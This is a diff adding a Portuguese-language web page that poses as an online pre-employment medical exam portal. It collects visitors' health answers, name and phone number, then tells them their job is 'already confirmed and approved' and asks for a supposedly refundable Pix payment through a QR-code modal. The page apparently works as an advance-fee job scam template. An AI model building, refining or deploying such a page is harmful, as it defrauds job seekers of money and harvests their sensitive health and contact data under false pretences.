@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Exame Admissional Digital</title>
+  <meta name="description" content="Realize seu exame admissional sem sair de casa. Rápido, seguro e 100% online.">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/flatpickr/dist/flatpickr.min.css"/>
+  <!-- Flatpickr locale PT-BR -->
+  <script src="https://cdn.jsdelivr.net/npm/flatpickr/dist/l10n/pt.js"></script>
+  <style>
+    .step { padding: 0.25rem 0.75rem; border-radius: 9999px; background-color: #e5e7eb; transition: all 0.3s; }
+    .step.active { background-color: #7c3aed; color: white; font-weight: bold; }
+  </style>
+
+  <script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "rqs6jaszdp");
+</script>
+</head>
+<body class="bg-gray-100 min-h-screen">
+
+  <nav id="progress-bar" class="fixed top-0 left-0 right-0 z-50 bg-white shadow-md py-3">
+    <div class="max-w-5xl mx-auto px-4 flex justify-between text-xs sm:text-sm text-gray-700">
+      <div class="step" data-step="1">1. Boas-vindas</div>
+      <div class="step" data-step="2">2. Questionário</div>
+      <div class="step" data-step="3">3. Regras</div>
+      <div class="step" data-step="4">4. Agendamento</div>
+      <div class="step" data-step="9">5. Final</div>
+    </div>
+  </nav>
+  <div class="h-20"></div>
+
+  <header class="bg-purple-700 text-white py-6 shadow-lg">
+    <div class="max-w-7xl mx-auto px-4">
+      <h1 class="text-3xl font-bold text-center">Portal de Exame Admissional Online</h1>
+      <p class="text-center text-sm mt-2">Tudo que você precisa em um só lugar. Rápido, fácil e 100% digital.</p>
+    </div>
+  </header>
+
+  <main class="max-w-3xl mx-auto py-10 px-6 space-y-10">
+    <!-- 1. Boas-vindas -->
+    <section class="bg-white rounded-2xl shadow p-6 space-y-4">
+      <h2 class="text-2xl font-semibold text-purple-700">Boas-vindas</h2>
+      <p class="text-gray-700">Seja bem-vindo ao processo admissional online. Aqui você poderá realizar todas as etapas do exame sem sair de casa, com total conforto e segurança.</p>
+      <p class="text-sm text-gray-500">Este processo leva em média 3 a 5 minutos.</p>
+    </section>
+
+    <!-- 2. Questionário de Saúde -->
+    <section class="bg-white rounded-2xl shadow p-6 space-y-4">
+      <h2 class="text-xl font-semibold text-purple-700">Questionário de Saúde</h2>
+      <label class="block text-sm font-medium text-gray-700">Você possui alguma alergia?</label>
+      <input id="field-allergy" type="text" class="w-full border border-gray-300 rounded-lg p-2 mb-3" placeholder="Descreva...">
+      <label class="block text-sm font-medium text-gray-700">Faz uso contínuo de medicamentos?</label>
+      <input id="field-meds" type="text" class="w-full border border-gray-300 rounded-lg p-2 mb-3" placeholder="Quais?">
+      <label class="block text-sm font-medium text-gray-700">Já teve alguma internação nos últimos 5 anos?</label>
+      <input id="field-hosp" type="text" class="w-full border border-gray-300 rounded-lg p-2 mb-3" placeholder="Motivo, se sim">
+      <label class="block text-sm font-medium text-gray-700">Resumo da sua saúde:</label>
+      <textarea id="health-answers" rows="5" class="w-full border border-gray-300 rounded-lg p-3 shadow-sm"></textarea>
+    </section>
+
+    <!-- 3. Orientações e Responsabilidades -->
+    <section class="bg-white rounded-2xl shadow p-6 space-y-4">
+      <h2 class="text-xl font-semibold text-purple-700">Orientações e Responsabilidades</h2>
+      <ul class="list-disc list-inside text-gray-700 space-y-2">
+        <li>Informações falsas podem resultar no cancelamento do processo.</li>
+        <li>É necessário estar com documento de identidade durante a videochamada.</li>
+        <li>A chamada deve ser feita de local silencioso e com iluminação adequada.</li>
+        <li>Evite atrasos. Tolerância de 5 minutos será aplicada.</li>
+      </ul>
+    </section>
+
+    <!-- 4. Agendamento da Videochamada -->
+    <section class="bg-white rounded-2xl shadow p-6 space-y-4">
+      <h2 class="text-xl font-semibold text-purple-700">Agendamento da Videochamada</h2>
+      <p class="text-gray-600">Durante a chamada, nossa equipe explicará sua função e responderá qualquer dúvida. Você receberá um aviso via WhatsApp e, no horário escolhido, realizaremos a ligação.</p>
+      <div class="space-y-3">
+        <input id="user-name" type="text" class="w-full px-4 py-2 border border-gray-300 rounded shadow-sm" placeholder="Seu nome completo (como deseja ser chamado)">
+        <input id="user-phone" type="tel" class="w-full px-4 py-2 border border-gray-300 rounded shadow-sm" placeholder="Número de telefone (com DDD)">
+<!-- CSS do Flatpickr -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/flatpickr/dist/flatpickr.min.css"/>
+
+<!-- Seu input -->
+<input
+  id="call-schedule"
+  type="text"
+  class="w-full px-4 py-2 border border-gray-300 rounded shadow-sm"
+  placeholder="Escolha data e horário da ligação"
+
+/>
+
+<!-- JS do Flatpickr + locale PT -->
+<script src="https://cdn.jsdelivr.net/npm/flatpickr"></script>
+<script src="https://cdn.jsdelivr.net/npm/flatpickr/dist/l10n/pt.js"></script>
+
+<script>
+  flatpickr("#call-schedule", {
+    locale: "pt",
+    enableTime: true,
+    time_24hr: true,
+    dateFormat: "d/m/Y H:i",
+    minDate: "today"
+  });
+</script>
+
+      </div>
+    </section>
+
+    <!-- 5. Botão de confirmação -->
+    <section class="text-center">
+      <button id="submit-all" class="bg-purple-600 hover:bg-purple-700 text-white px-8 py-3 rounded-lg shadow-md transition"> Confirmar Agendamento</button>
+
+      <div id="submit-msg" class="hidden mt-6 bg-green-100 text-green-800 p-5 rounded-xl shadow-md text-left space-y-2">
+        <p class="font-bold text-lg">Agendamento Confirmado!</p>
+        <p id="confirm-name"></p>
+        <p id="confirm-phone"></p>
+        <p id="confirm-date"></p>
+        <p>Você receberá uma mensagem de confirmação via <strong>WhatsApp</strong> com os detalhes.</p>
+        <p class="text-sm text-gray-600">No dia e horário escolhido, um de nossos atendentes irá te chamar para a videochamada.</p>
+      </div>
+    </section>
+
+    <!-- 6. Texto extra após confirmação -->
+    <div id="extra-text" class="hidden mt-8 max-w-2xl mx-auto bg-white rounded-2xl shadow-md p-6 text-left">
+      <h3 class="text-2xl font-bold text-purple-700 mb-3">Agendamento Confirmado!</h3>
+      <p class="text-gray-700 mb-4">Aguardamos seu pagamento para liberar:</p>
+      <ul class="list-disc list-inside text-gray-700 mb-4">
+        <li>Vídeochamada com o médico;</li>
+        <li>Exames pré-admissionais;</li>
+        <li>Liberação para início de trabalho.</li>
+      </ul>
+      <p class="text-gray-700 mb-4">Tenha em mãos: comprovante de pagamento, documento com foto e boa conexão.</p>
+      <p class="text-gray-700">Após confirmação, enviamos o link de chamada e instruções no seu WhatsApp.</p>
+      <p class="text-gray-700"><strong><em>Este valor será reembolsado assim que seu exame admissional for aprovado.</em></strong></p>
+      <div class="mt-4 text-center">
+      <button
+  id="pay-confirm"
+  onclick="window.location.href='../checkout/index.html';"
+  class="px-4 py-2 bg-purple-600 hover:bg-purple-700 text-white font-medium rounded transition"
+>
+  Realizar pagamento e confirmar exame
+</button>
+
+        <p class="text-gray-700 mt-2"><strong><em>Sua vaga já está confirmada e aprovada! Agora só precisamos destas informações para encaminhar sua documentação ao órgão governamental.</em></strong></p>
+      </div>
+    </div>
+  </main>
+
+  <script src="https://cdn.jsdelivr.net/npm/flatpickr"></script>
+  <script>
+    flatpickr("#call-schedule", {
+      enableTime: true,
+      dateFormat: "d/m/Y H:i",
+      minDate: "today",
+      locale: "pt"
+    });
+
+    document.getElementById("submit-all").addEventListener("click", () => {
+      const campos = [
+        { selector: "#user-name", mensagem: "Por favor, preencha seu nome." },
+        { selector: "#user-phone", mensagem: "Por favor, preencha seu telefone." },
+        { selector: "#call-schedule", mensagem: "Por favor, selecione data e horário." },
+        { selector: "#health-answers", mensagem: "Por favor, preencha o resumo da sua saúde." }
+      ];
+
+      campos.forEach(c => {
+        document.querySelector(c.selector).classList.remove("ring-2", "ring-red-500");
+      });
+
+      for (const campo of campos) {
+        const el = document.querySelector(campo.selector);
+        if (!el.value.trim()) {
+          el.classList.add("ring-2", "ring-red-500");
+          el.scrollIntoView({ behavior: "smooth", block: "center" });
+          el.focus();
+          alert(campo.mensagem);
+          return;
+        }
+      }
+
+      const name     = document.getElementById("user-name").value.trim();
+      const phone    = document.getElementById("user-phone").value.trim();
+      const schedule = document.getElementById("call-schedule").value;
+
+      document.getElementById("confirm-name").textContent = `👤 Nome: ${name}`;
+      document.getElementById("confirm-phone").textContent = `📞 Telefone: ${phone}`;
+      document.getElementById("confirm-date").textContent = `🗓️ Agendamento: ${schedule}`;
+
+      document.getElementById("submit-msg").classList.remove("hidden");
+      document.getElementById("extra-text").classList.remove("hidden");
+    });
+
+    const steps    = document.querySelectorAll(".step");
+    const sections = document.querySelectorAll("main section");
+    const observer = new IntersectionObserver(entries => {
+      entries.forEach(entry => {
+        if (entry.isIntersecting) {
+          const idx = Array.from(sections).indexOf(entry.target);
+          steps.forEach((step, i) => step.classList.toggle("active", i === idx));
+        }
+      });
+    }, { threshold: 0.5 });
+    sections.forEach(sec => observer.observe(sec));
+  </script>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      const botaoPix = document.getElementById("pay-confirm");
+      if (!botaoPix) return;
+
+      botaoPix.addEventListener("click", async (e) => {
+        e.preventDefault();
+
+        try {
+          const res = await fetch("/api/gerar-pix");
+          if (!res.ok) throw new Error("Erro ao gerar PIX");
+          const data = await res.json();
+
+          const modal = document.createElement("div");
+          Object.assign(modal.style, {
+            position: "fixed",
+            top: 0,
+            left: 0,
+            width: "100%",
+            height: "100%",
+            backgroundColor: "rgba(0,0,0,0.8)",
+            display: "flex",
+            alignItems: "center",
+            justifyContent: "center",
+            zIndex: "9999"
+          });
+
+          modal.innerHTML = `
+            <div style="background:white;padding:20px;border-radius:8px;text-align:center;max-width:90%;">
+              <h3>Escaneie para pagar com Pix</h3>
+              <img src="data:image/png;base64,${data.qr_code_base64}" style="max-width:300px;width:100%;" />
+              <p><a href="${data.qr_code_url}" target="_blank">Ou clique aqui para pagar</a></p>
+              <button id="close-pix-modal" style="margin-top:10px;">Fechar</button>
+            </div>
+          `;
+
+          document.body.appendChild(modal);
+          document.getElementById("close-pix-modal")
+            .addEventListener("click", () => document.body.removeChild(modal));
+        } catch (err) {
+          alert(err.message);
+        }
+      });
+    });
+  </script>
+
+</body>
+</html>
